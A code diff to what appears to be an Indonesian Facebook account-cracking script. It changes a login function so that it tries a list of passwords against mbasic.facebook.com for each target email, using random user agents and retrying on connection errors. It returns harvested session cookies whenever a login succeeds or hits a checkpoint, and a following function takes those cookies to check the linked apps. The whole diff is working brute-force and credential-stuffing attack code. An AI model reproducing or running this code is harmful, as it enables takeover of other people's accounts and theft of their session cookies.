@@ -1217,14 +1217,18 @@ def memex(idf,pwv):
 	prog.advance(des)
 	ua = random.choice(free)
 	r = requests.Session()
-	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	p = r.get("https://mbasic.facebook.com/")
-	b = r.post("https://mbasic.facebook.com/login.php", data={"email": idf, "pass": pwv, "login": "submit"})
-	kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
-	if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":idf,"pass":pwv,"cookies":kuki}
-	elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":idf,"pass":pwv,"cookies":kuki}
-	else:return {"status":"error","email":idf,"pass":pwv}
-    
+	for pw in pwv:
+		pw = pw.lower()
+		try:
+			r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			p = r.get("https://mbasic.facebook.com/")
+			b = r.post("https://mbasic.facebook.com/login.php", data={"email":idf, "pass":pw, "login": "submit"})
+			kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+			if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":idf,"pass":pw,"cookies":kuki}
+			elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":idf,"pass":pw,"cookies":kuki}
+			else:return {"status":"error","email":idf,"pass":pw}
+		except requests.exceptions.ConnectionError:time.sleep(31)
+	loop+=1
 #-----------------------[ CEK APLIKASI ]--------------------#
 def cek_apk(kuki):
 	session = requests.Session()
